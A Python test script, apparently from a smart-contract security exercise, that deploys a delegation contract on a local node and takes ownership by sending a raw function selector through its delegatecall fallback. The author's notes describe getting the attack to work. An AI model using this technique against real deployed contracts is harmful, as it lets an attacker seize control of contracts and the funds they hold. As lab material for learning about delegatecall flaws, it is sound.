"""
I tried so many different ways to make the function signature work (SHA3 library would not install on my machine) 
AttackDelegation.sol only resulted in the contract becomming the owner, not the attacker's wallet
Super frustrating but got the attack to succeed after I finally decided to use the regular Web3.py library.
Definitely taught me the shortcomings of Brownie (and the eth-brownie docs).  Web3.py can still be needed, for sure.
Shoutout once again to https://www.4byte.directory for helping me validate the in-line function signature.
"""

from brownie import accounts
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

from scripts.deploy import deploy_delegate_contracts


def test_delegation_attack():
    ## Arrange
    delegation_contract = deploy_delegate_contracts()
    attacker = accounts[2]
    # Assert
    assert delegation_contract.owner() != attacker.address
    assert delegation_contract.owner() == accounts[0].address
    # Act / attack
    w3.eth.send_transaction(
        {
            "to": delegation_contract.address,
            "from": attacker.address,
            "data": "0xdd365b8b",
        }
    )
    assert delegation_contract.owner() == attacker.address
